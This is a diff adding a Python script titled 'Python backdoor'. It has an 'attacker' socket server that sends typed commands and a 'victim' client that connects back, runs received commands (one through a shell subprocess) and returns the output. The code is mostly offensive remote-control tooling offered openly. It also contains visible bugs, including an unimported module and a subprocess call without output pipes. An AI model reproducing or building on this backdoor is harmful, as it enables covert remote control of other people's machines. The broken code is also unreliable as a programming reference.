@@ -1,0 +1,87 @@
+#Python backdoor
+
+# the attacker
+
+import json
+import socket 
+
+def command_receive():
+    data = ""
+    while True:
+        try:
+            data = data + conn.recv(1024).decode()
+            return json.loads(data)
+
+        except ValueError:
+            continue
+
+
+def command_send(data):
+    json_data = json.dumps(data)
+    conn.send(json_data.encode())
+
+
+def target_communication():
+    while True:
+        command = input(str("Shell~$s: " + str(add)))
+        command_send(command)
+        if command.lower() == 'quit':
+            break
+        response = command_receive()
+        print(response)
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('127.0.0.1', 5555))
+
+print("Server Listening For Incoming Connections.....")
+sock.listen(6)
+conn, add = sock.accept()
+print(f"Connection Established with {add} at", time.timezone)
+
+target_communication()
+
+
+
+# the victim
+import os
+import socket
+import json
+import subprocess
+
+
+def vic_receive():
+    data = ""
+    while True:
+        try:
+            data = data + vic.recv(1024).decode()
+            return json.loads(data)
+
+        except ValueError:
+            continue
+
+
+def command_send(data):
+    json_data = json.dumps(data)
+    vic.send(json_data.encode())
+
+
+def comm_run():
+    command = vic_receive()
+    if command.lower() == 'quit':
+        exit(0)
+    elif command == "cwd":
+        command_send(os.getcwd())
+    elif command == 'user':
+        command_send(os.getlogin())
+    elif command == 'dir':
+        result = subprocess.Popen(command, shell=True)
+        result = result.stdout.read() + result.stderr.read()
+        command_send(result.decode())
+        command_send(result)
+
+
+vic = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+vic.connect(('127.0.0.1', 5555))
+
+comm_run()
